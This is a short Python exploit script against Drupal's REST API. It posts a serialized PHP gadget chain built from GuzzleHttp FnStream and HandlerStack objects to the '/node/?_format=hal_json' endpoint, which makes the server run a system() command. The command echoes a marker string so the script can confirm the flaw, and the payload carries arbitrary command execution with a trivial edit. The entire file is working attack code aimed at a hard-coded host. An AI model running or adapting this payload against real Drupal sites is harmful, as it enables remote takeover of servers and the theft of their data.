#! coding=utf-8
import requests
import json
import re

def exploit(url):
    post_url =url+'/node/?_format=hal_json'
    ip=url.split('//')[1].split(':')[0]
    try:
        headers = {
        "User-Agent" : 'Test',
        "Content-Type":'application/hal+json',
        }
        post_data = {
            "link": [
                {
                    "value": "link",
                    "options": u"O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\u0000GuzzleHttp\\Psr7\\FnStream\u0000methods\";a:1:{s:5:\"close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:{s:32:\"\u0000GuzzleHttp\\HandlerStack\u0000handler\";s:37:\"echo Th1sIsATeStT0ProveAVulnerab1litY\";s:30:\"\u0000GuzzleHttp\\HandlerStack\u0000stack\";a:1:{i:0;a:1:{i:0;s:6:\"system\";}}s:31:\"\u0000GuzzleHttp\\HandlerStack\u0000cached\";b:0;}i:1;s:7:\"resolve\";}}s:9:\"_fn_close\";a:2:{i:0;r:4;i:1;s:7:\"resolve\";}}"
                }
            ],
            "_links": {
                "type": {
                    "href": "http://{}/rest/type/shortcut/default".format(ip)
                }
            }}
        post_data = json.dumps(post_data)
        res=requests.post(post_url,headers=headers,data=post_data)
        if res.status_code==403 and "Th1sIsATeStT0ProveAVulnerab1litY" in res.text:
            print('YES')
            return True,url
    except:
        return False
    return False



if __name__ == '__main__':
    exploit('http://10.10.250.77:80')
